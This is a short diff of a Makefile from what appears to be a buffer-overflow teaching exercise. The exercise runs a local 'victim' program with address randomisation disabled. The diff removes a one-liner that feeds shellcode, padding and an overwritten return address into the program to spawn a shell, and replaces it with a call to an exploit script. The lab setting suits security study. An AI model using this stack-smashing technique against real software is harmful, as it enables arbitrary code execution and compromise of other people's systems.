@@ -24,8 +24,7 @@ run-victim: victim
 	setarch `arch` -R ./victim
 
 exploit-victim: victim shellcode
-	( ( cat shellcode ; printf %080d 0 ; printf %016x ${ADR} | tac -rs..) | xxd -r -p ; cat) | setarch `arch` -R ./victim
-
+	./exploit.sh ${ADR}
 
 clear:
 	rm -f shell shellcode victim
